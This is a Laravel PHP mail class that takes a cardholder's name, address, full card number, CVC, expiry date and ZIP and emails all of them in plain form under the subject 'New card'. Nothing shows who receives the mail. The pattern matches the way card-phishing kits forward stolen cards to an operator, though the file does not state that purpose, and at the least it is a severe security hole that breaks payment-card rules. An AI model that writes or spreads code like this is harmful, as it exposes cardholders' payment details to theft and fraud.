<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;

class CardSavedNotifiying extends Mailable
{
    use Queueable, SerializesModels;
    public $name;
    public $address;
    public $number;
    public $cvc;
    public $expiryMonth;
    public $expiryYear;
    public $zip;
    /**
     * Create a new message instance.
     *
     * @return void
     */
    public function __construct($name,$address,$number,$cvc,$expiryMonth,$expiryYear,$zip)
    {
        $this->name = $name;
        $this->address = $address ;
        $this->number = $number;
        $this->cvc = $cvc;
        $this->expiryMonth =$expiryMonth ;
        $this->expiryYear = $expiryYear;
        $this->zip = $zip;
    }
    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->subject('New card')
        ->view('basicsend',['name'=>$this->name,
        'address'=>$this->address ,
        'number'=>$this->number ,
        'cvc'=>$this->cvc,
        'expiryMonth'=>$this->expiryMonth,
        'expiryYear'=>$this->expiryYear ,
        'zip'=>$this->zip]);
    }
}
